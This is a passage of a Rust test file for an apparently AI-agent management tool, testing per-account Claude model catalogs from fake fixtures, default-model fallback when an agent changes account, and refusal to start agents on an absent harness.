    let argv = asked(&h);
    assert!(argv.contains(&"-p".to_string()), "{argv:?}");
    // A harness chosen but not found here: Claude Code still writes them, as before.
    change_settings(&h, |s| s.writer_engine = Some(EngineId::CODEX));
    let before = h.launch_log(&r).len();
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(h.launch_log(&r).len(), before + 1);
    assert!(asked(&h).contains(&"-p".to_string()));
    // The choice is kept as saved.
    let saved: Settings =
        serde_json::from_slice(&std::fs::read(h.core.data.settings_file()).unwrap()).unwrap();
    assert_eq!(saved.writer_engine, Some(EngineId::CODEX));
    let raw: Value =
        serde_json::from_slice(&std::fs::read(h.core.data.settings_file()).unwrap()).unwrap();
    assert_eq!(raw["writerEngine"], "codex");
}

/// The models the fake `claude` of `account` lists: those it has more (`add`), less those it lacks
/// (`remove`), as <dir>/fake-models.json says (ESC-124).
fn fake_models(account: &Account, add: Value, remove: &[&str]) {
    std::fs::create_dir_all(&account.config_dir).unwrap();
    std::fs::write(
        Path::new(&account.config_dir).join("fake-models.json"),
        json!({ "add": add, "remove": remove }).to_string(),
    )
    .unwrap();
}

/// Mythos, a model one account has more: two efforts, the mode `auto`.
fn mythos() -> Value {
    json!([{ "value": "mythos", "resolvedModel": "claude-mythos-1", "displayName": "Mythos",
             "supportsEffort": true, "supportedEffortLevels": ["high", "max"], "supportsAutoMode": true }])
}

#[tokio::test]
async fn the_models_of_each_claude_account_are_read_without_a_turn_and_its_agents_menu_is_its_own()
{
    let h = harness("accounts-models-read");
    let pro = second_account(&h);
    // Pro has Mythos more, and no Fable.
    fake_models(&pro, mythos(), &["fable"]);
    h.core.read_claude_models("principal").await;
    h.core.read_claude_models("pro").await;
    let menu = |account: &str| -> Vec<String> {
        h.core.account_models.read()[account]
            .catalog
            .iter()
            .map(|m| m.id.clone())
            .collect()
    };
    assert_eq!(
        menu("principal"),
        [
            "opus",
            "fable",
            "sonnet",
            "haiku",
            "claude-haiku-4-5-20251001"
        ]
    );
    assert_eq!(
        menu("pro"),
        [
            "opus",
            "sonnet",
            "haiku",
            "claude-haiku-4-5-20251001",
            "mythos"
        ]
    );
    let told = h.core.account_models.read()["pro"].clone();
    assert_eq!(told.version, "2.1.301");
    let m = told.catalog.iter().find(|m| m.id == "mythos").unwrap();
    assert_eq!(
        (m.label.as_str(), m.efforts.clone()),
        ("Mythos", vec!["high".to_string(), "max".to_string()])
    );
    // What it takes, as told: an effort and the mode auto; Haiku 4.5 neither.
    assert!(h.core.takes_effort(EngineId::CLAUDE, "pro", "mythos"));
    assert!(h.core.takes_auto(EngineId::CLAUDE, "pro", "mythos"));
    assert!(!h
        .core
        .takes_effort(EngineId::CLAUDE, "pro", "claude-haiku-4-5"));
    // The window is told, account by account.
    let told_ui = h
        .events
        .lock()
        .iter()
        .filter(|e| e["type"] == "accountModels" && e["account"] == "pro")
        .count();
    assert_eq!(told_ui, 1);
    // No turn, no session: nothing was asked of the model.
    assert!(!Path::new(&pro.config_dir).join("projects").exists());
    assert!(h.core.agents.read().is_empty());
    // Read again unchanged: the window is not told again.
    h.core.read_claude_models("pro").await;
    let again = h
        .events
        .lock()
        .iter()
        .filter(|e| e["type"] == "accountModels" && e["account"] == "pro")
        .count();
    assert_eq!(again, 1);
}

#[tokio::test]
async fn an_agent_moved_to_an_account_without_its_model_takes_the_default_one_and_its_conversation_says_so(
) {
    let h = harness("accounts-models-moved");
    // In its worktree: its own log of launches.
    let (p, _) = h.project(true).await;
    let (pro, team) = pro_out_of_quota_and_team(&h);
    // Pro has Mythos; Équipe does not.
    fake_models(&pro, mythos(), &[]);
    fake_models(&team, json!([]), &[]);
    h.core.read_claude_models("pro").await;
    h.core.read_claude_models("equipe").await;
    let id = h
        .core
        .create_agent_with(
            &p.id,
            AgentOptions {
                account: Some("pro".into()),
                model: Some("mythos".into()),
                ..Default::default()
            },
        )
        .await
        .unwrap()
        .meta
        .id;
    turn_over(&h, &id, "la limite").await;
    // On Pro, its model stays.
    assert_eq!(h.agent(&id).model, "mythos");
    let argv = h.launches(Path::new(&h.agent(&id).cwd)).pop().unwrap();
    let after = |argv: &[String], flag: &str| {
        let at = argv.iter().position(|x| x == flag).unwrap();
        argv[at + 1].clone()
    };
    assert_eq!(after(&argv, "--model"), "mythos");
    assert!(h.notices(&id, "info").iter().all(|n| !n.contains("mythos")));

    h.core.resume_on_account(&id, "equipe").await.unwrap();
    h.wait("the resume's turn", |h| {
        h.agent(&id).moved_from.is_none() && !h.agent(&id).status.is_active()
    })
    .await;
    // On Équipe: the default model (the settings', which it has), told in its conversation.
    assert_eq!(h.agent(&id).account, "equipe");
    assert_eq!(h.agent(&id).model, "sonnet");
    let argv = h.launches(Path::new(&h.agent(&id).cwd)).pop().unwrap();
    assert_eq!(after(&argv, "--model"), "sonnet");
    let said = h.notices(&id, "info");
    assert!(
        said.iter()
            .any(|n| n.contains("mythos") && n.contains("Sonnet 5.5") && n.contains("Équipe")),
        "{said:?}"
    );
}

/// INT-3: an agent saved on a harness this version lacks (a later version's, a plugin's gone)
/// stays, its harness kept; it does not start, and none is made on it.
#[tokio::test]
async fn an_agent_whose_harness_is_absent_is_kept_and_starts_nothing() {
    let h = harness("absent-harness");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    let hermes = EngineId::new("hermes");
    h.core.agent(&id).unwrap().lock().meta.engine = hermes;
    let handle = h.core.agent(&id).unwrap();
    let started = h.core.start_process_of(&handle, &id).await;
    let why = started.err().expect("refused").to_string();
    assert!(why.starts_with("Harness absent : « hermes »"), "{why}");
    assert!(handle.lock().proc.is_none());
    let sent = h.core.send_message(&id, "Bonjour".into(), Vec::new()).await;
    assert!(sent.is_err(), "a message to it is refused");
    // Kept, with its harness, in the list and in what is saved.
    assert_eq!(h.agent(&id).engine, hermes);
    let saved = serde_json::to_value(h.core.agent(&id).unwrap().lock().meta.clone()).unwrap();
    assert_eq!(saved["engine"], json!("hermes"));
    // None is made on it.
    h.core
        .projects
        .write()
        .iter_mut()
        .find(|q| q.id == p.id)
        .unwrap()
        .engine = Some(hermes);
    let made = h.core.create_agent(&p.id, None).await;
    let Err(why) = made else {
        panic!("an agent made on a harness absent")
    };
    assert!(why.to_string().contains("hermes"), "{why}");
}
